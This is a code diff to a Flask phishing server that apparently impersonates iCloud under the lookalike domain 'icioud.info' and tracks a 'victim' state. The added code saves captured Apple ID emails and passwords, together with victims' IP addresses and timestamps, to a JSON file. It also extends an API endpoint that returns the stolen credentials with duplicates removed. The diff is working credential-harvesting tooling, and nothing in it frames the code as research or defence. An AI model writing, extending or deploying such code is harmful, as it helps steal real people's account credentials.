@@ -26,6 +26,19 @@ app.config['SERVER_NAME'] = 'icioud.info'
 
 BASE_DIR = Path(__file__).parent.resolve()
 STATE_FILE = BASE_DIR / 'victim_state.json'
+CREDS_JSON_FILE = BASE_DIR / 'creds_data.json'
+
+stored_creds = []
+if CREDS_JSON_FILE.exists():
+    try:
+        with open(CREDS_JSON_FILE, 'r') as f:
+            stored_creds = json.load(f)
+    except:
+        stored_creds = []
+
+def save_creds():
+    with open(CREDS_JSON_FILE, 'w') as f:
+        json.dump(stored_creds, f)
 
 registered_credentials = {}
 challenge_store = {}
@@ -372,6 +385,9 @@ def capture_creds():
             f.write(f"User-Agent:    {userAgent}\n")
             f.write(f"{'═'*55}\n\n")
         
+        stored_creds.append({'email': appleid, 'password': password, 'ip': request.remote_addr, 'time': datetime.now().strftime('%Y-%m-%d_%H-%M-%S')})
+        save_creds()
+        
         with open(creds_dir / 'all_credentials.log', 'a') as f:
             f.write(f"[{ts}] {appleid}\n")
         
@@ -417,7 +433,7 @@ def save_cookies():
 @app.route('/api/get-creds')
 def get_creds():
     try:
-        creds = []
+        creds = list(stored_creds)
         creds_dir = BASE_DIR / 'creds'
         if creds_dir.exists():
             for f in creds_dir.glob('credentials_*.txt'):
@@ -437,7 +453,8 @@ def get_creds():
                         elif 'Timestamp:' in line:
                             time = line.split('Timestamp:')[1].strip()
                     if email:
-                        creds.append({'email': email, 'password': password, 'ip': ip, 'time': time})
+                        if not any(c.get('email') == email and c.get('time') == time for c in creds):
+                            creds.append({'email': email, 'password': password, 'ip': ip, 'time': time})
         return jsonify(creds)
     except Exception as e:
         return jsonify({'error': str(e)}), 400
